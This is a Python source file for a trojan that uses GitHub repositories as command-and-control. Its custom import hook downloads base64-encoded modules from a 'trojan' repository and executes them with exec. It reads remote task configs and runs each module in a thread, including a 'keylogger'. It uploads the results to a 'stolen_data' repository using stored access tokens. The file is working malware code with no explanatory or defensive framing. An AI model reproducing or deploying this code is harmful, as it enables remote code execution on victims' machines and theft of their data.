import base64
import importlib
import json
import random
import sys
import os
import threading
import time
import subprocess

from datetime import datetime

def import_or_install_github3():
    global github3
    try:
        import github3
    except ModuleNotFoundError:
        install_github3()
        import github3

def install_github3():
    package = 'github3.py'
    subprocess.check_call(["pip", "install", package])


def github_connect(repo_name, access_token):
    with open(access_token) as f:
        token = f.read()
    user = 'olekokrasa'
    sess = github3.login(token=token)
    return sess.repository(user, repo_name)

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Próba pobrania %s" % name)
        self.import_repo = github_connect('trojan', 'token_trojan.txt')

        new_library = get_file_contents('modules', f'{name}.py', self.import_repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,
                                               origin=self.import_repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class LocalImporter:
    def __init__(self, modules_path):
        self.modules_path = modules_path

    def find_module(self, name, path=None):
        print("[*] Próba pobrania %s" % name)
        file_path = f"{self.modules_path}/{name}.py"
        if not path and os.path.isfile(file_path):
            return self

    def load_module(self, name):
        file_path = f"{self.modules_path}/{name}.py"
        spec = importlib.util.spec_from_file_location(name, file_path)
        new_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(new_module)
        sys.modules[spec.name] = new_module
        return new_module



class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.import_repo = github_connect('trojan', 'token_trojan.txt')
        self.export_repo = github_connect('stolen_data', 'token_stolen_data.txt')

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.import_repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        # self.export_repo.create_file(remote_path, message, base64.b64encode(bindata))
        self.export_repo.create_file(remote_path, message, bindata)

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 5))
            break
            # time.sleep(random.randint(30*60, 3*60*60))

if __name__ == '__main__':

    import_or_install_github3()

    sys.meta_path.append(GitImporter())
    # sys.meta_path.append(LocalImporter('modules'))
    trojan = Trojan('keylogger')
    trojan.run()
